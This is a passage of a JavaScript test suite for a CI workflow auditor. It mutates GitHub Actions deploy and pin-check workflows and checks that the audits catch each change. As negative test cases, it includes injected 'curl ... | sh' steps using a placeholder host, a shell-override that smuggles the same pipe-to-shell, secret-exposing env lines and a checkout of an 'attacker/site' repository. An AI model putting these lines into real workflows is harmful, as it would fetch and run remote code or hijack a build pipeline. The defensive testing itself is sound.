  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /\npermissions:\n  contents: read\n/, '\npermissions:\n  contents: read\n  pages: write\n')), /workflow permissions carries keys outside \{contents\}: pages/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /    if: github\.event_name != 'pull_request'\n/, "    if: github.event_name != 'push'\n")), /job "deploy" if must be exactly/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /    if: github\.event_name != 'pull_request'\n/, '')), /job "deploy" lacks required key "if"/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /    needs: validate\n/, '    needs: browser-smoke\n')), /job "deploy" needs must be exactly "validate"/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /      id-token: write\n/, '      id-token: write\n      actions: write\n')), /job "deploy" permissions carries keys outside/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /  validate:\n    runs-on: ubuntu-26\.04\n/, '  validate:\n    runs-on: ubuntu-26.04\n    permissions:\n      pages: write\n      id-token: write\n')), /job "validate" carries keys outside \{runs-on, steps\}: permissions/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /      - name: Scan submissions for secrets\n/, '      - uses: actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346 # v5.0.1\n      - name: Scan submissions for secrets\n')), /uses a Pages\/deploy action \(actions\/deploy-pages\) outside the deploy job — unexpected deploy path/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /      - name: Scan submissions for secrets\n        run: node scripts\/scan-secrets\.mjs\n/, '      - name: Scan submissions for secrets\n        run: node scripts/scan-secrets.mjs\n        shell: bash\n')), /step #\d+ carries keys outside/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /      - name: Scan submissions for secrets\n        run: node scripts\/scan-secrets\.mjs\n/, '      - name: Scan submissions for secrets\n        if: false\n        run: node scripts/scan-secrets.mjs\n')), /if \(must be an expression string, never a bare boolean\) must be a string, got false/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /^name: AI Arena CI \/ Pages\n/, 'name: AI Arena CI / Pages\nenv:\n  A: b\n')), /workflow carries keys outside/));
});

test('CI-6e: pin-check isolation arms — every rule RED and the canonical-form gate RED; the only legitimate drift (SHA bump + cron edit) stays GREEN', () => {
  const arms = [
    [/  workflow_dispatch:\n/, '  workflow_dispatch:\n  push:\n    branches: ["main"]\n', /only be triggered by schedule\/workflow_dispatch.*carries keys outside/],
    [/  workflow_dispatch:\n/, '  workflow_dispatch:\n  "pull_request_target":\n    branches: ["main"]\n', /quoted key "pull_request_target"|carries keys outside/],
    [/    timeout-minutes: 5\n/, '    timeout-minutes: 5\n    permissions:\n      actions: write\n', /must have exactly one top-level permissions: block|must not hold any write permission: "write"|carries keys outside/],
    [/    timeout-minutes: 5\n/, '    timeout-minutes: 5\n    "permissions":\n      "contents": write\n      "pages": write\n', /quoted key "permissions"|must not hold any write permission/],
    [/    timeout-minutes: 5\n/, '    timeout-minutes: 5\n    "environment": github-pages\n', /must not use "environment:"|quoted key "environment"/],
    [/run: node scripts\/check-node-pin\.mjs\n/, 'run: node scripts/check-node-pin.mjs\n      - uses: actions/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346 # v5.0.1\n', /Pages\/deploy|unexpected deploy path|must be exactly checkout → setup-node → run/],
    [/run: node scripts\/check-node-pin\.mjs\n/, 'run: node scripts/check-node-pin.mjs\n        env:\n          T: ${{ secrets.X }}\n', /secrets or GITHUB_TOKEN|must not use "env:"/],
    [/  workflow_dispatch:\n/, '', /lacks required key "workflow_dispatch"/],
    [/run: node scripts\/check-node-pin\.mjs\n/, 'run: node scripts/check-node-pin.mjs\n      - run: curl -s https://example.invalid | sh\n', /must be exactly checkout → setup-node → run/],
    [/        run: node scripts\/check-node-pin\.mjs\n/, '        shell: bash -c "curl -s https://example.invalid | sh; {0}"\n        run: node scripts/check-node-pin.mjs\n', /must not use "shell:"/],
    [/run: node scripts\/check-node-pin\.mjs\n/, 'run: node scripts/check-node-pin.mjs\n      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1\n', /must be exactly checkout → setup-node → run/],
    [/\njobs:\n/, '\njobs:\n  other:\n    runs-on: ubuntu-26.04\n    steps:\n      - run: node scripts/check-node-pin.mjs\n', /exactly one job.*carries keys outside/],
    [/    timeout-minutes: 5\n/, '', /lacks required key "timeout-minutes"/],
    [/    timeout-minutes: 5\n/, '    timeout-minutes: 500\n', /timeout-minutes must be an integer in 1\.\.15/],
    [/run: node scripts\/check-node-pin\.mjs\n/, 'run: node scripts/check-node-pin.mjs --allow-stale\n', /may only run "node scripts\/check-node-pin\.mjs"/],
    [/          node-version-file: "\.node-version"\n/, '          node-version-file: ".node-version"\n          mirror: https://example.invalid\n', /may only pass node-version-file|not allowlisted/],
    [/          node-version-file: "\.node-version"\n/, '          node-version-file: ".node-version # x"\n', /node-version-file must be exactly the string "\.node-version"/],
    [/      - name: Checkout\n/, '      - name: Checkout\n        with:\n          repository: someone/else\n', /must be exactly checkout → setup-node → run/],
  ];
  for (const [from, to, expect] of arms) {
    const t = mutate(PIN_CHECK, from, to);
    const p = auditPinCheckWorkflow(t);
    assert.ok(p.some((x) => expect.test(x)), `arm not caught: ${String(from).slice(0, 40)} → ${to.slice(0, 40)}: ${p.join(' | ')}`);
    assert.notEqual(canonicalPinCheck(t), PIN_CHECK_CANONICAL, 'canonical-form gate (CI-5b) must also go RED');
  }
  // (Grok R4 F3) a cron that never fires (31 Feb), out-of-range fields, day-of-week 7, names, @weekly, non-weekly shapes → RED
  for (const bad of ['0 0 31 2 *', '60 6 * * 1', '17 24 * * 1', '17 6 * * 7', '17 6 1 * *', '@weekly', '17 6 * * MON', '*/5 * * * *']) {
    assert.ok(has(auditPinCheckWorkflow(mutate(PIN_CHECK, /cron: "17 6 \* \* 1"/, `cron: "${bad}"`)), /cron must be a weekly/), `cron not caught: ${bad}`);
  }
  assert.ok(has(auditPinCheckWorkflow(mutate(PIN_CHECK, /    - cron: "17 6 \* \* 1" # Mondays 06:17 UTC\n/, '    - cron: "17 6 * * 1"\n    - cron: "0 0 31 2 *"\n')), /exactly one cron/));
  // 未加引號的 cron 對解析器仍是同一個字串（`*` 使其非數字）→ 語義相同、GREEN；canonical form 不區分引號
  const unquotedCron = mutate(PIN_CHECK, /    - cron: "17 6 \* \* 1" # Mondays 06:17 UTC\n/, '    - cron: 17 6 * * 1\n');
  assert.equal(toJS(unquotedCron).on.schedule[0].cron, '17 6 * * 1');
  assert.deepEqual(auditPinCheckWorkflow(unquotedCron), []);
  assert.equal(canonicalPinCheck(unquotedCron), PIN_CHECK_CANONICAL);
  // canonical gate: key order is part of the frozen form
  assert.notEqual(canonicalPinCheck(mutate(PIN_CHECK, /\npermissions:\n  contents: read\n\njobs:/, '\njobs:')), PIN_CHECK_CANONICAL);
  assert.ok(has(auditPinCheckWorkflow(mutate(PIN_CHECK, /^name: Node pin check\n\n([\s\S]*?)\non:\n/m, '$1\non:\n').replace(/\npermissions:\n  contents: read\n/, '\npermissions:\n  contents: read\nname: Node pin check\n')), /keys must be in the canonical order/));
  // (i) canonical-form gate survives the ONLY legitimate drift (Dependabot SHA bump + version comment, cron edit)
  const bumped = PIN_CHECK.replace(/actions\/checkout@[0-9a-f]{40} # v7\.0\.1/, 'actions/checkout@' + 'f'.repeat(40) + ' # v7.1.0').replace(/cron: "17 6 \* \* 1"/, 'cron: "5 4 * * 2"');
  assert.notEqual(bumped, PIN_CHECK);
  assert.equal(canonicalPinCheck(bumped), PIN_CHECK_CANONICAL);
  assert.deepEqual(auditPinCheckWorkflow(bumped), []);
  assert.equal(canonicalPinCheck('not: [valid'), null, 'unparseable input never equals the template');
});

test('CI-6g (Codex head-9 F1/F2, head-10 F1/F2): no audit crashes — explicit keys without values are REPORTED (pages + pin-check), not thrown; checkout only as step #1; every deploy step frozen except its name (action, run, if, continue-on-error, id, with)', () => {
  // F1: `? node-version: 1` (compact-mapping key, no value node) used to throw a TypeError inside the visitor; now reported as policy + fail closed
  for (const t of ['? node-version: 1\n', '? k\n', `${PAGES}? junk\n`, 'a:\n  ? b\n']) {
    const p = auditWorkflowYaml(t);
    assert.ok(Array.isArray(p) && p.length > 0, `must report, not throw: ${JSON.stringify(t.slice(-30))}`);
    assert.ok(has(p, /explicit key \("\? key"\)/) || has(p, /without a value node|non-scalar mapping key/), p.join(' | '));
    assert.ok(!has(p, /audit internal error/), `no internal error for ${JSON.stringify(t.slice(-30))}: ${p.join(' | ')}`);
  }
  // the semantic entry points report (non-empty, policy message, no internal error) rather than throw or swallow (Codex head-10 F2)
  for (const [label, fn, t] of [
    ['pages + ? junk', auditPagesWorkflow, `${PAGES}? junk\n`],
    ['pages: ? continue-on-error in a step', auditPagesWorkflow, 'jobs:\n  validate:\n    steps:\n      - ? continue-on-error\n        uses: x\n'],
    ['pin-check + ? junk', auditPinCheckWorkflow, `${PIN_CHECK}? junk\n`],
    ['pin-check: valueless explicit key under on', auditPinCheckWorkflow, mutate(PIN_CHECK, /  workflow_dispatch:\n/, '  workflow_dispatch:\n  ? push\n')],
    ['pin-check: ? node-version in with', auditPinCheckWorkflow, mutate(PIN_CHECK, /          node-version-file: "\.node-version"\n/, '          node-version-file: ".node-version"\n          ? node-version\n')],
  ]) {
    let p; assert.doesNotThrow(() => { p = fn(t); }, label);
    assert.ok(p.length > 0 && has(p, /explicit key \("\? key"\)/) && !has(p, /audit internal error/), `${label}: ${p.join(' | ')}`);
  }
  // the guard itself is load-bearing: an audit that throws is converted into a fail-closed problem (never a silent pass)
  assert.deepEqual(guarded(() => { throw new TypeError('boom'); })('x'), ['[audit internal error — fail closed] TypeError: boom']);
  // F2: a later actions/checkout (with repository:/ref: override) anywhere in a job → RED; replacing the retry step keeps 10 uses but breaks the deploy shape
  const GEN_DEPLOY = /      - name: Generate task manifest\n        run: node scripts\/build-manifest\.mjs --strict\n\n      # Closed-world assembler/;
  const laterCheckout = mutate(PAGES, GEN_DEPLOY, '      - name: Generate task manifest\n        run: node scripts/build-manifest.mjs --strict\n\n      - name: Replace the workspace\n        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          repository: attacker/site\n\n      # Closed-world assembler');
  const lc1 = auditPagesWorkflow(laterCheckout);
  assert.ok(has(lc1, /job "deploy" step #5: actions\/checkout may only appear as step #1/) && has(lc1, /must have exactly 9 steps|canonical publication step/), lc1.join(' | '));
  const RETRY = /      - name: Retry GitHub Pages deployment\n        id: deployment_retry\n        if: steps\.deployment\.outcome == 'failure'\n        uses: actions\/deploy-pages@368f82528645a54fb793d4d04e342629a3f51346 # v5\.0\.1\n        with:\n          artifact_name: github-pages-\$\{\{ github\.run_attempt \}\}\n          timeout: 600000\n/;
  const swapped = mutate(mutate(PAGES, RETRY, ''), GEN_DEPLOY, '      - name: Generate task manifest\n        run: node scripts/build-manifest.mjs --strict\n\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          repository: attacker/site\n\n      # Closed-world assembler');
  assert.equal((swapped.match(/^\s*(?:- )?uses:/gm) || []).length, 10, 'the mutation keeps the uses count at 10');
  const sw = auditPagesWorkflow(swapped);
  assert.ok(has(sw, /actions\/checkout may only appear as step #1/) && has(sw, /canonical publication step/), sw.join(' | '));
  const validateCheckout = mutate(PAGES, /      - name: Scan submissions for secrets\n/, '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          repository: attacker/site\n      - name: Scan submissions for secrets\n');
  assert.ok(has(auditPagesWorkflow(validateCheckout), /job "validate" step #5: actions\/checkout may only appear as step #1/));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /      - name: Install Chromium only\n/, '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n      - name: Install Chromium only\n')), /job "browser-smoke" step #\d+: actions\/checkout may only appear as step #1/));
  // deploy canonical steps: change a run command, the upload path, drop the retry, add a step → RED; real file GREEN
  const DEPLOY_STEP = /job "deploy" step #\d+ must be exactly the canonical publication step|job "deploy" must have exactly 9 steps/;
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /      - name: Build static site \(closed-world assembler\)\n        run: node scripts\/assemble-site\.mjs\n/, '      - name: Build static site (closed-world assembler)\n        run: node scripts/assemble-site.mjs --allow-strays\n')), DEPLOY_STEP));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /          path: _site\n/, '          path: .\n')), DEPLOY_STEP));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, RETRY, '')), DEPLOY_STEP));
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /      - name: Configure Pages\n/, '      - run: echo pre\n      - name: Configure Pages\n')), DEPLOY_STEP));
  // (Codex head-10 F1) deploy step CONTROLS and inputs are frozen too: a non-blocking assembler, an always-upload, an extra/changed input, a changed
  // retry condition, a dropped id, a changed node-version-file on deploy's setup-node → RED; renaming a step (name is cosmetic) stays GREEN
  const ASM = /      - name: Build static site \(closed-world assembler\)\n        run: node scripts\/assemble-site\.mjs\n/;
  const UP = /      - name: Upload Pages artifact\n        uses: actions\/upload-pages-artifact@([0-9a-f]{40}) # v5\.0\.0\n/;
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, ASM, '      - name: Build static site (closed-world assembler)\n        continue-on-error: true\n        run: node scripts/assemble-site.mjs\n')), DEPLOY_STEP), 'continue-on-error on the assembler');
  // (Grok head-10 F1, same class) the assemble step skipped via an expression `if` while its run string is unchanged → RED
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, ASM, '      - name: Build static site (closed-world assembler)\n        if: ${{ false }}\n        run: node scripts/assemble-site.mjs\n')), DEPLOY_STEP), 'if: ${{ false }} on the assembler');
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, ASM, '      - name: Build static site (closed-world assembler)\n        if: false\n        run: node scripts/assemble-site.mjs\n')), DEPLOY_STEP), 'if: false on the assembler');
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, UP, '      - name: Upload Pages artifact\n        if: always()\n        uses: actions/upload-pages-artifact@$1 # v5.0.0\n')), DEPLOY_STEP), 'if: always() on the upload');
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /          path: _site\n/, '          path: _site\n          retention-days: 1\n')), DEPLOY_STEP), 'extra upload input');
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /          timeout: 600000\n/, '          timeout: 1\n')), DEPLOY_STEP), 'changed deploy-pages input');
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /        id: deployment_retry\n        if: steps\.deployment\.outcome == 'failure'\n/, '        id: deployment_retry\n        if: always()\n')), DEPLOY_STEP), 'changed retry condition');
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /        id: deployment\n/, '')), DEPLOY_STEP), 'dropped step id');
  assert.ok(has(auditPagesWorkflow(mutate(PAGES, /        continue-on-error: true\n        with:\n          artifact_name/, '        with:\n          artifact_name')), DEPLOY_STEP), 'dropped continue-on-error on the first deploy-pages');
  assert.deepEqual(auditPagesWorkflow(mutate(PAGES, /      - name: Build static site \(closed-world assembler\)\n/, '      - name: Assemble\n')), [], 'step names are cosmetic');
  assert.deepEqual(auditPagesWorkflow(PAGES), []);
});

test('CI-6f: .node-version real predicate against known-bad values (not constant comparison)', () => {
  assert.deepEqual(auditNodeVersionFile('22.23.4\n'), []);
  assert.ok(has(auditNodeVersionFile('24.22.1\n'), /major 24 != approved 22/));
  assert.ok(has(auditNodeVersionFile('22\n'), /exact X\.Y\.Z/));
  assert.ok(has(auditNodeVersionFile('v22.23.4\n'), /exact X\.Y\.Z/));
  assert.ok(has(auditNodeVersionFile('22.23.4\n\n'), /trailing newline/));
  assert.ok(has(auditNodeVersionFile('22.23.4'), /trailing newline/));
});
